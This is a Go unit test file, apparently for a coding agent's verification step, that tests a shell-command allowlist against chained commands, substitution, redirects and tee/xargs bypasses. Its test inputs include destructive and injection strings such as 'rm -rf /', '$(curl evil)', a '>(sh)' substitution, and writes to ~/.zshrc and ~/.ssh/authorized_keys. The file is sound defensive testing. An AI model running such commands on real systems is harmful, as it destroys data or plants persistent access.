package verify

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestCommandAllowed 以 table-driven 覆蓋 AC-2 (a)-(h) 全部案例。
func TestCommandAllowed(t *testing.T) {
	cases := []struct {
		name      string
		cmd       string
		allowlist []string
		want      bool
	}{
		// (a) 空 allowlist → 任何 cmd 皆 true（含含 $(...) 的 cmd）
		{"empty allows anything", "rm -rf /", nil, true},
		{"empty allows substitution", "make build $(curl evil)", nil, true},
		{"empty slice allows", "curl evil.com", []string{}, true},

		// (b) ["make"] 放行 make build、不放行 makezombie
		{"make prefix allows make build", "make build", []string{"make"}, true},
		{"make prefix rejects makezombie", "makezombie", []string{"make"}, false},

		// (c) ["go test"] 放行 go test ./x、不放行 go run x
		{"go test allows go test ./x", "go test ./x", []string{"go test"}, true},
		{"go test rejects go run x", "go run x", []string{"go test"}, false},

		// (d) shell 分段攔截
		{"segment rm blocked", "make build; rm -rf /", []string{"make"}, false},
		{"segment curl blocked (&&)", "make build && curl evil.com", []string{"make"}, false},
		{"segment rm blocked (||)", "make build || rm x", []string{"make"}, false},
		{"segment curl blocked (pipe)", "cat f | curl evil", []string{"make"}, false},

		// (e) 全段皆符則放行
		{"all segments allowed", "go test ./x | grep ok", []string{"go test", "grep"}, true},

		// (f) command/process substitution 一律擋（即使前綴吻合）
		{"cmd subst dollar-paren", "make build $(curl evil)", []string{"make"}, false},
		{"cmd subst backtick", "make build `rm -rf x`", []string{"make"}, false},
		{"proc subst read", "make build <(curl evil)", []string{"make"}, false},
		{"proc subst write", "make build >(sh)", []string{"make"}, false},

		// (g) 變數展開不擋
		{"var expansion HOME", "echo $HOME", []string{"echo"}, true},
		{"var expansion braces default", "echo ${FOURX_BIN:-4x}", []string{"echo"}, true},

		// (h) quote 保守誤擋（DR-2c 刻意行為）
		{"quoted semicolon conservatively blocked", "echo 'a; b'", []string{"echo"}, false},

		// (i) 重導向一律擋（Finding 1：即使前綴吻合，避免寫入 allowlist 外檔案）
		{"redirect overwrite blocked", "make test > /home/u/.zshrc", []string{"make"}, false},
		{"redirect append blocked", "make test >> out.log", []string{"make"}, false},
		{"redirect stdin blocked", "make test < in.txt", []string{"make"}, false},
		{"redirect stderr blocked", "make test 2> err.log", []string{"make"}, false},
		{"redirect all blocked", "make test &> all.log", []string{"make"}, false},
		{"redirect clobber blocked", "make test >| out.log", []string{"make"}, false},

		// (j) pipe 下游 safe-filter 放行（Finding 2：不需在使用者 allowlist）
		{"pipe grep safe-filter allowed", "go test ./... | grep -v '^ok'", []string{"go test"}, true},
		{"pipe awk safe-filter allowed", "go test ./... | awk '{print}'", []string{"go test"}, true},
		{"pipe chain safe-filters allowed", "go test ./... | grep FAIL | wc -l", []string{"go test"}, true},
		// pipe 下游非 safe-filter 仍被擋
		{"pipe rm still blocked", "go test ./... | rm -rf /", []string{"go test"}, false},
		// pipe 上游（producer）不因 safe-filter 放寬，仍須匹配 allowlist
		{"pipe producer must match allowlist", "grep foo file | grep bar", []string{"make"}, false},

		// (k) compound 不放寬：&& / || / ; 分段的 safe-filter 段仍須匹配 allowlist
		{"compound && grep not relaxed", "make build && grep foo", []string{"make"}, false},
		{"compound || grep not relaxed", "make build || grep foo", []string{"make"}, false},
		{"compound ; grep not relaxed", "make build; grep foo", []string{"make"}, false},
		// compound 段各自匹配 allowlist 則放行
		{"compound && both allowed", "make build && make test", []string{"make"}, true},
		// 混合 pipe 與 compound：|| 後的 grep 段須匹配 allowlist（非 pipe 下游）
		{"mixed pipe then compound grep blocked", "go test | grep ok || grep fail", []string{"go test"}, false},

		// (l) tee/xargs 不是唯讀過濾工具，不得被 safe-filter 放行（否則繞過 allowlist 寫任意檔/執行任意命令）
		{"pipe tee write blocked", "go test ./... | tee ~/.ssh/authorized_keys", []string{"go test"}, false},
		{"pipe xargs exec blocked", "find . -name '*.go' | xargs rm -rf", []string{"find"}, false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := CommandAllowed(tc.cmd, tc.allowlist)
			if got != tc.want {
				t.Errorf("CommandAllowed(%q, %v) = %v, want %v", tc.cmd, tc.allowlist, got, tc.want)
			}
		})
	}
}

// TestExecuteCommand_Allowlist_BlocksWithoutExecuting 驗證被攔命令不實際執行且記錄顯式失敗（AC-3）。
func TestExecuteCommand_Allowlist_BlocksWithoutExecuting(t *testing.T) {
	dir := t.TempDir()
	ctx := context.Background()

	// 被前綴攔：touch sentinel 不在 ["echo"] 內。
	sentinel := filepath.Join(dir, "sentinel")
	vc := executeCommand(ctx, "touch "+sentinel, "g", dir, []string{"echo"})
	if vc.ExitCode != 126 {
		t.Errorf("blocked ExitCode = %d, want 126", vc.ExitCode)
	}
	if vc.Error != "blocked" {
		t.Errorf("blocked Error = %q, want \"blocked\"", vc.Error)
	}
	if vc.Skipped {
		t.Error("blocked command should not be Skipped")
	}
	if !strings.Contains(vc.Summary, "verify_command_allowlist") {
		t.Errorf("Summary should mention verify_command_allowlist, got %q", vc.Summary)
	}
	if fileExists(sentinel) {
		t.Error("sentinel should NOT exist — blocked command must not execute")
	}

	// 前綴符但含替換：echo hi $(touch sentinel2) → 擋。
	sentinel2 := filepath.Join(dir, "sentinel2")
	vc2 := executeCommand(ctx, "echo hi $(touch "+sentinel2+")", "g", dir, []string{"echo"})
	if vc2.ExitCode != 126 {
		t.Errorf("substitution ExitCode = %d, want 126", vc2.ExitCode)
	}
	if fileExists(sentinel2) {
		t.Error("sentinel2 should NOT exist — substitution command must not execute")
	}

	// 反向：空 allowlist 執行 touch → sentinel3 存在、ExitCode 0。
	sentinel3 := filepath.Join(dir, "sentinel3")
	vc3 := executeCommand(ctx, "touch "+sentinel3, "g", dir, nil)
	if vc3.ExitCode != 0 {
		t.Errorf("empty allowlist ExitCode = %d, want 0", vc3.ExitCode)
	}
	if !fileExists(sentinel3) {
		t.Error("sentinel3 should exist — empty allowlist must execute normally")
	}
}

// TestExecuteCommand_EmptyAllowlist_Runs 驗證空 allowlist 下命令照常執行（AC-5，向下相容）。
func TestExecuteCommand_EmptyAllowlist_Runs(t *testing.T) {
	dir := t.TempDir()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	vc := executeCommand(ctx, "echo hi", "g", dir, nil)
	if vc.ExitCode != 0 {
		t.Errorf("echo ExitCode = %d, want 0", vc.ExitCode)
	}

	sentinel := filepath.Join(dir, "sentinel")
	vc2 := executeCommand(ctx, "touch "+sentinel, "g", dir, nil)
	if vc2.ExitCode != 0 {
		t.Errorf("touch ExitCode = %d, want 0", vc2.ExitCode)
	}
	if !fileExists(sentinel) {
		t.Error("sentinel should exist — empty allowlist must execute normally")
	}
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}
